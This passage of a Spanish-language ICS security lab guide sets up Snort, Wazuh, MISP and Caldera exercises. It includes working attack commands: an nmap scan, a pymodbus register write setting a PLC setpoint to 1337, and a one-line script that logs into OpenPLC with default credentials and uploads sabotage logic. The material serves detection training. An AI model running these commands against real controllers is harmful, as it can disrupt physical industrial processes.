+4. Confirme en el propio Dashboard/Monitoring que las variables `setpoint_temperatura` (`75`) y `nivel_tanque` (`50`) aparecen con sus valores iniciales.
+
+**Evidencie**
+
+* Captura del programa compilado y en ejecución (Dashboard con **Start PLC** activo).
+* Captura de los valores iniciales de las dos variables.
+
+### 3.0.3. Verificación de la monitorización pasiva (Snort)
+
+1. En `snort-server`, confirme que el inspector Modbus está activo (resultado de `prep-openplc-snort.sh`):
+   ```bash
+   sudo snort -T -c /etc/snort/snort.lua
+   ```
+   Debe listar `modbus`, `stream` y `stream_tcp` entre los módulos cargados, sin errores.
+2. Con el PLC ya arrancado, deje Snort corriendo y observe que **no** aparece ninguna alerta en `alert_fast.txt`, aunque el puerto `502` esté activo y aceptando conexiones.
+
+> **Pregunta de autoevaluación:** ¿por qué no se puede instalar un agente de Wazuh directamente dentro del firmware del OpenPLC? *(Respuesta esperada: restricciones de tiempo real, ausencia de un sistema operativo tradicional donde correr un agente, y el riesgo que supone para la criticidad de la planta introducir software no certificado.)*
+>
+> **Pregunta de autoevaluación:** ¿por qué el tráfico hacia el puerto 502 no genera ninguna alerta en este punto? *(Respuesta esperada: es tráfico lícito/esperado; un IDS bien diseñado no alerta por la mera existencia de tráfico a un servicio, solo ante patrones anómalos o comportamientos no autorizados, como se verá en el Ejercicio 3.1.)*
+
+**Evidencie**
+
+* Captura de `snort -T` mostrando el inspector Modbus cargado.
+* Captura de `alert_fast.txt` vacío o sin alertas relacionadas con el PLC.
+
+### Validación / Troubleshooting
+
+* Si el programa no compila, revise que el fichero `.st` se subió completo y sin modificar.
+* Si `pymodbus` (en el Ejercicio 3.1) no logra conectar más adelante, vuelva aquí y confirme que el PLC está realmente **arrancado** (**Start PLC**), no solo compilado: sin un programa en ejecución, OpenPLC no abre el puerto Modbus aunque la opción esté activada.
+* Si **Monitoring** aparece vacía pese a que el programa está `Running`, borre las entradas antiguas de **Programs** (sobre todo si hubo algún intento de compilación fallido previo) y vuelva a subir/compilar el `.st` desde cero.
+* Si escribe por Modbus en la dirección `0` y la escritura se confirma (incluso leyéndola de vuelta con `read_holding_registers`), pero **Monitoring** no refleja ningún cambio en `setpoint_temperatura`: no es un fallo de OpenPLC, es la dirección Modbus equivocada. OpenPLC reparte los Holding Registers en dos bloques con offsets distintos: las salidas físicas (`%QW`) ocupan las direcciones `0`-`1023`, y la memoria interna (`%MW`, donde vive `setpoint_temperatura`) ocupa las direcciones `1024`-`2047`. `%MW0` es, por tanto, la dirección Modbus `1024`, no la `0` (ver también la nota del Ejercicio 3.1). Escribir en la dirección `0` es una operación válida (cae sobre `%QW0`), simplemente no está mapeada a ninguna variable del programa.
+
+### Evidencias a entregar
+
+* Programa `.st` subido y compilado.
+* Valores iniciales de las variables del proceso (por Monitoring o, si falla, por lectura `pymodbus`).
+* Validación de Snort con el inspector Modbus activo, sin alertas.
+
+### Conclusión final
+
+Incluya:
+
+* Diferencia entre monitorización basada en agentes (IT, Wazuh) y monitorización pasiva de red (OT, Snort), y por qué esa diferencia no es una limitación técnica menor sino una restricción estructural del entorno OT.
+* Qué papel juega este estado "base" (proceso arrancado, sin alertas) como punto de referencia para detectar anomalías después.
+
+---
+
+## Ejercicio 3.1 — Cadena de ataque OT: reconocimiento, interrogación y sabotaje Modbus
+
+### Objetivo
+
+Modbus/TCP no tiene autenticación ni cifrado por diseño: cualquiera que alcance el puerto 502 puede leer o escribir registros con los propios comandos legítimos del protocolo, sin exploits ni malware. Por eso un adversario ICS real no lanza directamente una escritura: primero descubre qué hay expuesto, después interroga el proceso para entender qué está controlando, y solo entonces sabotea con conocimiento de causa (así operan grupos reales centrados en ICS, como Sandworm/Electrum). Este ejercicio reproduce esas tres fases con Caldera, reutilizando el **mismo agente y la misma IP** de `snort-server` que ya tiene antecedentes de reconocimiento y fuerza bruta contra IT (Ejercicios 1.4/1.6/2.7): no es un ataque OT aislado, es el mismo actor pivotando de IT a OT. Snort debe detectar cada fase de forma distinta, gracias al inspector nativo de Modbus configurado en el Ejercicio 3.0.
+
+### Prerrequisitos
+
+* Ejercicio 3.0 completado (PLC arrancado con `tanque_control.st`, Snort con el inspector Modbus activo y sin alertas).
+* Ejercicio 1.4 completado (regla `600010` de escaneo TCP SYN activa en Wazuh).
+* Ejercicio 1.3 completado (agente de Caldera activo en `snort-server`).
+
+---
+
+### 3.1.1. Preparación e identificación (reglas de detección)
+
+En `snort-server`, añada **dos** reglas al fichero de reglas locales: una para la lectura de registros (fase de interrogación) y otra para la escritura (fase de sabotaje):
+
+```bash
+sudo nano /etc/snort/rules/local.rules
+```
+
+```
+alert tcp any any -> any 502 ( msg:"Lectura Modbus de registros (FC3, posible enumeracion OT)"; modbus_func:3; sid:1000031; rev:1; )
+alert tcp any any -> any 502 ( msg:"Escritura Modbus no autorizada (FC6, Write Single Register)"; modbus_func:6; sid:1000030; rev:1; )
+```
+
+Valide y relance Snort (recuerde: no recarga en caliente):
+
+```bash
+sudo snort -T -c /etc/snort/snort.lua
+sudo snort -i ens33 -c /etc/snort/snort.lua -A alert_fast -k none -l /var/log/snort
+```
+
+> La opción `modbus_func` la resuelve el inspector nativo de Modbus de Snort 3 (configurado en el Ejercicio 3.0): identifica el código de función Modbus dentro del payload. El `3` es **Read Holding Registers** (lectura) y el `6` es **Write Single Register** (escritura).
+
+**Evidencie**
+
+* Captura de las dos reglas añadidas y de `snort -T` validándolas sin errores.
+
+### 3.1.2. Ejecución (Adversary en Caldera: cadena de 3 fases)
+
+> ℹ️ **Nota sobre direccionamiento Modbus:** OpenPLC reparte el espacio de Holding Registers en dos bloques con offsets distintos: las salidas físicas (`%QW`) ocupan las direcciones Modbus `0`-`1023`, y la memoria interna (`%MW`, donde vive `setpoint_temperatura`) ocupa las direcciones `1024`-`2047`. Es decir, `%MW0` corresponde a la dirección Modbus **`1024`**, no a la `0`. Si se ataca la dirección `0` la escritura se confirma igualmente (existe como registro válido), pero cae sobre `%QW0`, que no está mapeado a ninguna variable del programa, así que no se ve reflejada en ningún sitio.
+
+Cree en Caldera **cuatro** abilities nuevas (**Abilities → Create Ability**), ejecutadas contra el agente de `snort-server`:
+
+| | Tactic | Technique | Command (Executor `sh`) |
+|---|---|---|---|
+| **Setup** | `command-and-control` | `T1105` — Ingress Tool Transfer | `sudo apt-get install -y nmap && pip install --break-system-packages pymodbus` |
+| **Recon** | `discovery` | `T0846.001` — Remote System Discovery: Port Scan | `nmap -sS -Pn -p 1-40 <IP_PLC_SERVER>` |
+| **Collection** | `collection` | `T0861` — Point & Tag Identification | `python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('<IP_PLC_SERVER>'); c.connect(); r=c.read_holding_registers(address=1024, count=2); print(r.registers if not r.isError() else 'Error'); c.close()"` |
+| **Impact** | `impair-process-control` | `T0855` — Unauthorized Command Message | `python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('<IP_PLC_SERVER>'); c.connect(); r=c.write_register(address=1024, value=1337); print('Error' if r.isError() else 'OK'); c.close()"` |
+
+> ℹ️ **Por qué `-p 1-40` y no un escaneo completo ni una lista de 5-6 puertos ICS:** la regla `600010`/sid `1001010` usa `detection_filter: count 20, seconds 3`, que en Snort no genera una única alerta al cruzar el umbral: **sigue alertando en cada paquete siguiente** que matchee mientras dure la ventana. Un escaneo sin restringir puertos (`nmap -sS -Pn` a secas, como en el Ejercicio 1.4) prueba por defecto ~1000 puertos, así que una vez se cruza el umbral genera fácilmente 900+ alertas duplicadas, que inundan el dashboard de Wazuh y entierran las alertas de `600400`/`600410`/`600420` que sí interesa ver. `-p 1-40` da un margen cómodo por encima de los 20 SYN necesarios sin dispararse a mil: suficiente para detonar la regla de forma fiable con un puñado de alertas, no una avalancha.
+
+Agrúpelas en un Adversary (por ejemplo, `Modbus-Heist`), en orden Setup → Recon → Collection → Impact, y ejecute la operación (**Group:** `red`, **Adversary:** el que acaba de crear, no `No Adversary (manual)`).
+
+**Evidencie**
+
+* Captura de las 4 abilities y del Adversary, con el orden de ejecución.
+* Captura de la operación ejecutada, con las cuatro tasks en estado `SUCCESS`.
+
+### 3.1.3. Validación end-to-end
+
+En `snort-server`, compruebe `alert_fast.txt`:
+
+```bash
+cat /var/log/snort/alert_fast.txt
+```
+
+**Resultado esperado** (en este orden):
+
+1. Alerta(s) "Posible TCP SYN scan detectado" (regla `600010`, reutilizada del Ejercicio 1.4) por el escaneo de puertos ICS.
+2. Alerta "Lectura Modbus de registros (FC3, posible enumeracion OT)" por la interrogación de `%MW0`/`%MW1`.
+3. Alerta(s) "Escritura Modbus no autorizada (FC6, Write Single Register)" con origen `snort-server` y destino `plc-server:502`. Es normal ver la alerta duplicada (una por cada dirección del intercambio: la petición de escritura y la confirmación que devuelve el PLC).
+
+> **Pregunta de autoevaluación:** ¿qué diferencia operativa hay entre una lectura de registros (FC3) y una orden de escritura (FC6) desde la perspectiva de la seguridad industrial, y por qué tiene sentido que ambas generen alertas de severidad distinta? *(Respuesta esperada: una lectura solo consulta el estado del proceso, no lo altera; una escritura puede cambiar un parámetro de control real, con consecuencias físicas. Por eso el IDS/SIEM trata la lectura como reconocimiento de menor severidad y la escritura como el evento crítico.)*
+
+**Evidencie**
+
+* Captura/log de las tres alertas, en orden.
+
+### Validación / Troubleshooting
+
+* Si no aparece ninguna alerta, confirme que Snort tiene `stream`/`stream_tcp`/`modbus` cargados (`snort -T`) y que se relanzó **después** de guardar las reglas nuevas.
+* Si no aparece la alerta de escaneo (`600010`), confirme que la regla del Ejercicio 1.4 sigue activa (sid `1001010`, umbral `count 20, seconds 3` en `/etc/snort/rules/local.rules`) y que el comando de la ability escanea al menos `1-40` puertos (`nmap -sS -Pn -p 1-40 <IP_PLC_SERVER>`); un escaneo a un puñado de puertos ICS no llega a los 20 SYN necesarios en la ventana de 3 segundos. Si el agente de Caldera no corre como root, `nmap -sS` cae automáticamente a un *connect scan* (`-sT`), lo cual sigue disparando la regla (todo TCP handshake empieza con un SYN), pero puede añadir reintentos en puertos cerrados y descuadrar el tiempo; relance el escaneo si hace falta.
+* Si el dashboard de Wazuh se llena de decenas/cientos de alertas `600202` idénticas (todas con `"rule_id":"600010"` dentro del campo `misp_ip.source`) y no ve las de `600400`/`600410`/`600420`: es que la ability de Recon está escaneando más puertos de la cuenta. `detection_filter` en Snort no genera una única alerta al cruzar el umbral, sigue alertando en cada paquete siguiente que matchee mientras dure la ventana de 3 segundos; un escaneo amplio (por ejemplo, sin restringir puertos) puede generar cientos de alertas duplicadas de escaneo que entierran el resto. Confirme que la ability usa exactamente `-p 1-40` (no un rango mayor ni un escaneo sin acotar), y filtre por las otras reglas explícitamente: `sudo grep '"integration":"misp_ip"' /var/ossec/logs/alerts/alerts.json | grep -E '"rule_id":"(600400|600410|600420)"'`.
+* Si la ability de Caldera falla con un error de conexión, confirme que el PLC sigue arrancado (Ejercicio 3.0) y que la IP usada en el script es la de `plc-server`.
+
+### Evidencias a entregar
+
+* Reglas de detección Modbus (FC3 y FC6).
+* Abilities y Adversary de Caldera (las 4 fases).
+* Las tres alertas en `alert_fast.txt`, en orden.
+
+### Conclusión final
+
+Incluya:
+
+* Por qué detectar el **abuso de un protocolo legítimo** (Modbus usado tal cual, sin exploits) es un reto distinto al de detectar malware o vulnerabilidades clásicas de IT.
+* Qué papel juega el inspector nativo de protocolo (frente a un simple matching de puerto/contenido) para poder distinguir una lectura de una escritura.
+* Por qué modelar el ataque como una **cadena de tres fases** (y no como una única escritura aislada) es más representativo de un incidente ICS real, y qué le aporta esto al SOC frente a ver solo el paso final.
+
+---
+
+## Ejercicio 3.2 — Correlación SOC e investigación con CTI (MISP)
+
+### Objetivo
+
+Cerrar el ciclo del SOC en dos niveles: primero, correlacionando dentro de Wazuh el reconocimiento y el sabotaje del Ejercicio 3.1 (dos alertas de red que, por separado, son ruido o un incidente aislado, y juntas son un ataque crítico); después, conectando esa alerta con la inteligencia de amenazas ya construida en MISP y practicando una primera respuesta a incidentes razonada sobre un escenario OT.
+
+### Prerrequisitos
+
+* Ejercicio 2.7 completado (evento en MISP documentando a `snort-server` como IP con antecedentes de IT).
+* Ejercicio 2.4 completado (`wazuh-misp.sh` desplegado).
+* Ejercicio 3.1 completado (cadena de ataque Modbus detectada por Snort: escaneo, lectura y escritura).
+
+---
+
+### 3.2.1. Preparación e identificación (evento OT en MISP)
+
+Como usuario de laboratorio, cree un evento nuevo en MISP:
+
+* `Info`: "Amenaza OT: Manipulación de PLC".
+* Atributo `ip-src` = IP de `snort-server`, `Distribution: Inherit event`, marcado **IDS**. En el comentario, referencie el evento del Ejercicio 2.7 (misma IP, antecedentes de reconocimiento y fuerza bruta SSH documentados allí).
+* **Add new cluster** → Galaxy `Attack Pattern` → busque `T0855` (ATT&CK for ICS) → `Unauthorized Command Message`. Si quiere dejar constancia de la cadena completa, añada también `T0846.001` y `T0861`.
+* **Add new cluster** → Galaxy `Threat Actor` → busque `Electrum` (alias `Sandworm`, grupo real conocido por sabotaje de infraestructura eléctrica con ICS). El objetivo es que el informe deje de tratar el evento como un dato suelto y pase a documentarlo como parte de una **campaña atribuible**, no un incidente aislado.
+* **Publish** el evento.
+
+**Evidencie**
+
+* Captura del evento publicado, con el atributo `ip-src` y las Galaxies `Attack Pattern`/`Threat Actor` visibles.
+
+### 3.2.2. Ejecución (reglas Wazuh + correlación IT→OT)
+
+1. En `wazuh-manager`, añada las reglas nuevas en `/var/ossec/etc/rules/snort_local_rules.xml`, dentro del `<group>` existente junto a `600001`/`600010`/`600300`:
+
+   ```xml
+   <rule id="600400" level="10">
+     <match>Escritura Modbus no autorizada</match>
+     <description>Snort - posible manipulacion no autorizada de PLC via Modbus (FC6)</description>
+   </rule>
+
+   <rule id="600410" level="6">
+     <match>Lectura Modbus de registros</match>
+     <description>Snort - posible enumeracion/interrogacion OT via Modbus (FC3)</description>
+   </rule>
+
+   <rule id="600420" level="12" timeframe="300">
+     <if_sid>600400</if_sid>
+     <if_matched_sid>600010</if_matched_sid>
+     <description>CRITICAL: Movimiento lateral IT-OT y sabotaje industrial detectado (escaneo de red seguido de escritura Modbus no autorizada)</description>
+   </rule>
+   ```
+
+   ```bash
+   sudo systemctl restart wazuh-manager
+   ```
+
+   > La regla `600420` es la que convierte dos alertas de red separadas en un incidente: solo dispara si `600010` (escaneo) ya disparó en los `300` segundos previos a que dispare `600400` (escritura Modbus). Es la diferencia entre ver "un escaneo" y "una escritura Modbus" como dos líneas sueltas en el dashboard, o verlas como un único ataque con nivel 12.
+
+2. Vuelva a ejecutar `wazuh-misp.sh` e indique en el prompt de reglas: `600001,600010,600300,600400,600410,600420`.
+3. Repita la operación de Caldera del Ejercicio 3.1 (las 4 fases) para generar la secuencia completa.
+
+**Evidencie**
+
+* Captura de las tres reglas Wazuh nuevas (`600400`, `600410`, `600420`).
+* Salida de `wazuh-misp.sh` con las seis reglas incluidas.
+
+### 3.2.3. Validación e investigación
+
+En `wazuh-manager`:
+
+```bash
+sudo grep '"integration":"misp_ip"' /var/ossec/logs/alerts/alerts.json | tail -5
+```
+
+o en el Dashboard de Wazuh (**☰ → Threat Intelligence → Threat Hunting**, filtrando por `rule.id: 600202`).
+
+**Resultado esperado**
+
+* Alerta `600420` (nivel 12) confirmando la correlación "escaneo + escritura Modbus" desde `snort-server`.
+* Alerta `600202` (nivel 12) con `misp_ip.ip` = IP de `snort-server`, `matched_field: srcip`, y `permalink` al evento "Amenaza OT: Manipulación de PLC" de MISP.
+
+> El Ejercicio 3.6 cierra el capítulo OT con un playbook formal de respuesta a incidentes que cubre esta alerta y todas las posteriores del capítulo: no hace falta redactar nada aquí todavía.
+
+**Evidencie**
+
+* Captura de la alerta `600420` y de la alerta `600202` con el `permalink` al evento OT.
+
+### Validación / Troubleshooting
+
+* Si `found` sigue en `0`, confirme que el evento de MISP está `Published` y que la IP registrada es la de `snort-server`, no la de `caldera-server`.
+* Si no aparecen las alertas `600400`/`600410` en absoluto, revise primero el Ejercicio 3.1 (la detección de Snort debe funcionar antes de que Wazuh tenga nada que correlacionar o MISP nada que enriquecer).
+* Si no aparece `600420`, confirme que `600010` (escaneo) disparó **antes** que `600400` (escritura) y dentro de los 300 segundos de `timeframe`; si el hueco entre fases fue mayor (por ejemplo, tardó en relanzar Snort o en reintentar una ability fallida), repita la operación completa de Caldera de una sola vez, sin pausas manuales entre fases.
+* Confirme también que Snort **estaba corriendo** durante toda la operación: si se cae a mitad y se relanza tarde, las fases posteriores al reinicio no generan alertas hasta que Snort vuelve a estar activo, y la ventana de 300s puede agotarse esperando.
+
+### Evidencias a entregar
+
+* Evento OT en MISP (`ip-src`, Galaxies `Attack Pattern` y `Threat Actor`).
+* Reglas Wazuh `600400`, `600410` y `600420`.
+* Alerta `600420` y alerta `600202` con el `permalink`.
+
+### Conclusión final
+
+Incluya:
+
+* Cómo esta correlación demuestra un **ataque transversal**: la misma IP con antecedentes de actividad IT (Ejercicio 2.7) reaparece escaneando y atacando un activo OT, y tanto la regla `600420` (dentro de Wazuh) como MISP (entre incidentes) son lo que permite reconocerlo como el mismo actor en vez de eventos sueltos.
+* Qué aporta la correlación `600420` a la priorización real de un SOC: un escaneo por sí solo es ruido de bajo nivel, una escritura Modbus por sí sola ya es grave, pero verlas encadenadas desde el mismo origen es lo que justifica una respuesta de máxima prioridad.
+
+---
+
+## Ejercicio 3.3 — Respuesta activa automatizada: Active Response guiada por CTI
+
+### Objetivo
+
+Hasta ahora, MISP y Wazuh se han usado para **detectar y priorizar** (Ejercicio 3.2): la IP tiene antecedentes, la alerta sube a crítica, pero la acción sigue siendo manual (la que describirá el playbook formal del Ejercicio 3.6). Este ejercicio cierra ese último paso con **Active Response** de Wazuh: cuando la correlación CTI confirma con alta confianza que un host es un actor conocido (no ante cualquier alerta de Modbus suelta), Wazuh ejecuta automáticamente una acción de firewall, sin intervención humana. Es la pieza que convierte el SOC de "detecta y avisa" a "detecta, decide y actúa" (el patrón SOAR).
+
+> ⚠️ **Limitación de topología, léala antes de empezar:** el mecanismo de Active Response de Wazuh (`firewall-drop`) está pensado para ejecutarse en el **host defendido**, bloqueando la IP del atacante que le llega (así lo usa la documentación oficial: agente en la víctima, se bloquea al origen del ataque). En este laboratorio `plc-server` no tiene agente Wazuh (decisión deliberada del Ejercicio 3.0) y `snort-server` es a la vez el sensor de red y el propio host atacante (agente de Caldera): no hay ningún agente colocado "delante" del PLC. Por eso un bloqueo en línea que corte el tráfico hacia el PLC no es alcanzable sin añadir una VM de pasarela/segmentación nueva con agente propio, lo cual queda fuera del alcance de este proyecto. Este ejercicio demuestra el mecanismo completo (CTI confirma → Active Response actúa) aplicándolo sobre el propio `wazuh-manager`: al confirmarse que `snort-server` es un actor conocido, el manager le revoca el acceso a la infraestructura de gestión del SOC. Documente esta limitación en la memoria como alcance acotado, no como un fallo: en un despliegue real, el mismo bloque `<active-response>` se desplegaría en una pasarela/firewall en línea delante del segmento OT.
+
+### Prerrequisitos
+
+* Ejercicio 3.2 completado (reglas `600202` y `600420` disparando correctamente).
+* El binario `iptables` instalado en `wazuh-manager`: Debian 12 no lo trae por defecto (usa `nftables`), pero el `firewall-drop` de Wazuh depende de él. Compruébelo con `which iptables`; si no aparece, instálelo con `sudo apt-get install -y iptables` (instala `iptables-nft`, una capa de compatibilidad que traduce a `nftables` por debajo). Sin esto, la respuesta activa falla en silencio: la alerta dispara pero no se genera ninguna regla de firewall.
+* `wazuh-misp.sh` redesplegado con la versión más reciente de `custom-misp_ip.py` (vuelva a ejecutarlo si no lo ha hecho después del Ejercicio 3.2): el script ahora expone la IP también como campo `srcip` de nivel superior, que es donde `firewall-drop` la busca.
+
+---
+
+### 3.3.1. Preparación (Active Response en el manager)
+
+En `wazuh-manager`, edite:
+
+```bash
+sudo nano /var/ossec/etc/ossec.conf
+```
+
+Compruebe primero si ya existe una definición del comando `firewall-drop` (`grep -A3 "firewall-drop" /var/ossec/etc/ossec.conf`); si no aparece, añádala junto con el bloque de disparo, dentro de `<ossec_config>`:
+
+```xml
+<command>
+  <name>firewall-drop</name>
+  <executable>firewall-drop</executable>
+  <timeout_allowed>yes</timeout_allowed>
+</command>
+
+<active-response>
+  <command>firewall-drop</command>
+  <location>server</location>
+  <rules_id>600202</rules_id>
+  <timeout>120</timeout>
+</active-response>
+```
+
+> `location: server` ejecuta la respuesta en el propio `wazuh-manager` (no en el agente que generó la alerta), y solo se dispara ante la regla `600202` (confirmación de MISP), no ante cualquier alerta de Modbus suelta: es deliberadamente conservador, para que la automatización solo actúe con alta confianza. `timeout: 120` retira el bloqueo a los 2 minutos: suficiente para observarlo y capturarlo como evidencia, sin dejar el sensor a ciegas más de lo necesario (ver aviso siguiente).
+
+Reinicie Wazuh:
+
+```bash
+sudo systemctl restart wazuh-manager
+```
+
+**Evidencie**
+
+* Captura del bloque `<active-response>` añadido.
+
+### 3.3.2. Ejecución
+
+Repita la cadena de ataque completa del Ejercicio 3.1 (operación de Caldera con las 4 fases) para que se disparen de nuevo `600400`, `600420` y `600202`.
+
+**Evidencie**
+
+* Captura de la operación de Caldera ejecutada.
+
+### 3.3.3. Validación
+
+En `wazuh-manager`:
+
+```bash
+sudo iptables -L INPUT -n | grep <IP_SNORT_SERVER>
+sudo tail -n 20 /var/ossec/logs/active-responses.log
+```
+
+**Resultado esperado**
+
+* Una regla `DROP` para la IP de `snort-server` en `iptables`.
+* Una entrada en `active-responses.log` confirmando la ejecución de `firewall-drop`, con `rule_id: 600202`, sin el error `Cannot read 'srcip' from data`.
+
+> **Pregunta de autoevaluación:** ¿por qué se ata la respuesta activa a `600202` y no directamente a `600400` (la escritura Modbus) ni a `600420` (la correlación de mayor severidad)? *(Respuesta esperada: hay dos motivos distintos y complementarios. Primero, uno de confianza: `600400` puede ser un falso positivo o una prueba legítima, y anclar una acción disruptiva ahí sería arriesgado; `600202`/`600420` exigen además una correlación de CTI o de comportamiento. Segundo, uno técnico, propio de este laboratorio: `600420` nace de Snort, cuyo formato no decodifica Wazuh en este entorno, así que nunca trae la IP que `firewall-drop` necesita leer; `600202` sí, porque la genera un script propio que controla su formato de salida.)*
+
+**Evidencie**
+
+* Captura de la regla `iptables` y de la entrada en `active-responses.log`.
+
+**Limpieza:** una vez capturada la evidencia, no hace falta esperar los 120 segundos si quiere seguir trabajando con `snort-server` (por ejemplo, para la Investigación Opcional): quite el bloqueo a mano.
+
+```bash
+sudo iptables -D INPUT -s <IP_SNORT_SERVER> -j DROP
+```
+
+### Validación / Troubleshooting
+
+* Si no aparece la regla `iptables`, confirme que `firewall-drop` está definido en `ossec.conf` (algunas instalaciones de Wazuh ya lo traen por defecto; si lo duplica, dará error de XML al reiniciar) y que `wazuh-manager` se reinició después del cambio.
+* Si `active-responses.log` muestra `Cannot read 'srcip' from data`: revise que `<rules_id>` solo contenga `600202` (no `600400`/`600410`/`600420`, que nunca traen ese campo) y que redesplegó `wazuh-misp.sh` **después** de que se añadiera el campo `srcip` de nivel superior a `custom-misp_ip.py`; si sigue fallando, confirme en el propio JSON de una alerta `600202` reciente que trae `"data":{"srcip":"...", ...}` además del bloque `misp_ip` anidado.
+* Si `iptables: command not found` al ejecutar `firewall-drop` (visible en `active-responses.log`): instale `iptables` como se indica en Prerrequisitos.
+* Si el bloqueo no desaparece pasado el `timeout`, revise `active-responses.log`: es el propio Wazuh quien debe revertirlo (no lo elimine a mano con `iptables -D` salvo para depurar).
+* El bloque `<active-response>` queda activo de forma **permanente** en `ossec.conf`: si más adelante repite el Ejercicio 3.1/3.2 (para rehacer capturas, la Investigación Opcional, o una demo), `600202` volverá a disparar el bloqueo automáticamente. Es el comportamiento correcto (una respuesta automatizada persistente, no de un solo uso), pero si en algún momento le resulta molesto, coméntelo/bórrelo de `ossec.conf` y reinicie `wazuh-manager` para desactivarlo; vuelva a añadirlo del mismo modo para reactivarlo.
+
+### Evidencias a entregar
+
+* Bloque `<active-response>` en `ossec.conf`.
+* Regla `iptables` generada y entrada en `active-responses.log`.
+* Respuesta a la pregunta de autoevaluación.
+
+### Conclusión final
+
+Incluya:
+
+* Cómo este ejercicio cierra el ciclo detección → enriquecimiento (CTI) → decisión → acción, frente a los Ejercicios 3.1/3.2, que se quedaban en detección y correlación.
+* Por qué la respuesta activa se ancla a alertas de **alta confianza** (correlacionadas con CTI) y no a la primera alerta de red que aparece, y qué riesgo evita esa decisión de diseño.
+* La limitación de topología explicada al inicio del ejercicio (sin agente en el PLC, sensor = host atacante) y cómo se resolvería en un despliegue real con una pasarela/firewall en línea delante del segmento OT.
+
+---
+
+## Ejercicio 3.4 — Persistencia OT: reprogramación no autorizada del PLC (Program Download)
+
+### Objetivo
+
+Todos los ataques anteriores (Ejercicios 3.1-3.3) manipulan el proceso a través de Modbus: una acción puntual, reversible con la siguiente lectura/escritura legítima. Este ejercicio simula algo cualitativamente distinto: en vez de escribir un valor, el adversario sube un **programa nuevo** al PLC a través de la interfaz web de OpenPLC (HTTP, puerto 8080 — no Modbus), sustituyendo la lógica de control real. Es la técnica `T0843 - Program Download` de MITRE ATT&CK for ICS (táctica **Lateral Movement**, verificada), y es mucho más seria que una escritura suelta:
+
+* **Persiste**: sobrevive a reinicios y a cualquier intento de "arreglarlo" escribiendo un valor por Modbus, porque el propio programa vuelve a sobreescribirlo en el siguiente ciclo de scan (cada 500ms).
+* **Amplía la superficie de detección**: es tráfico HTTP contra el puerto 8080, no Modbus contra el 502 — un activo real casi nunca expone un único protocolo, y este ejercicio lo refleja.
+* **No depende solo de una IP**: el indicador relevante pasa a ser "quién se autenticó en la interfaz web y subió un programa", no una IP suelta consultada contra MISP — responde directamente a la limitación ya identificada en los Ejercicios 3.2/3.3. El Ejercicio 3.5 lleva esta idea hasta el final, verificando la herramienta exacta (hash) y la secuencia completa de técnicas empleadas (TTPs), sin ningún campo de IP de por medio.
+
+### Prerrequisitos
+
+* Ejercicio 3.1 completado (inspector Modbus y agente de Caldera operativos).
+* `prep-openplc-snort.sh` redesplegado con la versión que añade también el inspector `http_inspect` (si se ejecutó antes de este ejercicio, vuelva a lanzarlo; es idempotente y solo añadirá el bloque que falte).
+* El fichero [`OpenPLC/tanque_sabotaje.st`](../OpenPLC/tanque_sabotaje.st) del repositorio (léalo antes de empezar: es el programa que se subirá).
+
+---
+
+### 3.4.1. Preparación e identificación (regla de detección)
+
+En `snort-server`, añada la regla nueva al fichero de reglas locales:
+
+```bash
+sudo nano /etc/snort/rules/local.rules
+```
+
+```
+alert tcp any any -> any 8080 ( msg:"Posible descarga de programa PLC no autorizada (subida via interfaz web OpenPLC)"; flow:to_server,established; http_uri; content:"/upload-program-action"; sid:1000032; rev:1; )
+```
+
+Valide y relance Snort:
+
+```bash
+sudo snort -T -c /etc/snort/snort.lua
+sudo snort -i ens33 -c /etc/snort/snort.lua -A alert_fast -k none -l /var/log/snort
+```
+
+> `http_uri` es un *sticky buffer*: hace que el `content` que le sigue se compare contra la URI de la petición HTTP decodificada por `http_inspect` (el inspector nativo habilitado por `prep-openplc-snort.sh`), no contra el paquete crudo. Se dispara con la petición a `/upload-program-action`, que es el paso que realmente registra el programa nuevo (a diferencia de `/upload-program`, que solo sube un fichero temporal).
+
+**Evidencie**
+
+* Captura de la regla añadida y de `snort -T` validándola sin errores.
+
+### 3.4.2. Ejecución (Adversary en Caldera)
+
+Cree en Caldera dos abilities nuevas, ejecutadas contra el agente de `snort-server`:
+
+| | Tactic | Technique | Command (Executor `sh`) |
+|---|---|---|---|
+| **Setup** | `command-and-control` | `T1105` — Ingress Tool Transfer | `pip install --break-system-packages requests` |
+| **Impact** | `lateral-movement` | `T0843` — Program Download | ver script abajo |
+
+El comando de **Impact** sube [`tanque_sabotaje.st`](../OpenPLC/tanque_sabotaje.st) y reproduce el flujo real de la interfaz web de OpenPLC (login → subir fichero → registrar programa → compilar → arrancar), verificado directamente contra el código fuente del propio `webserver.py` de OpenPLC. Va en **una sola línea** a propósito (el campo de la ability en Caldera no conserva saltos de línea; un heredoc multilínea se rompe al guardarlo):
+
+```
+printf 'PROGRAM tanque_process\n  VAR_EXTERNAL\n    setpoint_temperatura : INT;\n    nivel_tanque : INT;\n  END_VAR\n  setpoint_temperatura := 9999;\n  nivel_tanque := 0;\nEND_PROGRAM\n\nCONFIGURATION Config0\n  VAR_GLOBAL\n    setpoint_temperatura AT %%MW0 : INT;\n    nivel_tanque AT %%MW1 : INT;\n  END_VAR\n  RESOURCE Res0 ON PLC\n    TASK task0(INTERVAL := T#500ms, PRIORITY := 0);\n    PROGRAM inst0 WITH task0 : tanque_process;\n  END_RESOURCE\nEND_CONFIGURATION\n' > /tmp/tanque_sabotaje.st && python3 -c 'import requests, re, time, sys; ip = "<IP_PLC_SERVER>"; base = f"http://{ip}:8080"; s = requests.Session(); s.headers.update({"Connection": "close"}); print("1 login"); s.post(f"{base}/login", data={"username": "openplc", "password": "openplc"}, timeout=15); print("2 upload"); r = s.post(f"{base}/upload-program", files={"file": ("tanque_sabotaje.st", open("/tmp/tanque_sabotaje.st", "rb"))}, timeout=30); m = re.search(r"(\d+\.st)", r.text); fname = m.group(1) if m else sys.exit("ERROR: no se encontro el nombre de fichero generado"); print("3 fname", fname); print("4 register"); s.post(f"{base}/upload-program-action", data={"prog_name": "tanque_process", "prog_descr": "firmware update", "prog_file": fname, "epoch_time": str(int(time.time()))}, timeout=15); print("5 compile"); s.get(f"{base}/compile-program", params={"file": fname}, timeout=90); print("6 compiled, esperando"); time.sleep(10); print("7 start_plc"); s.get(f"{base}/start_plc", timeout=60); print("OK", fname)'
+```
+
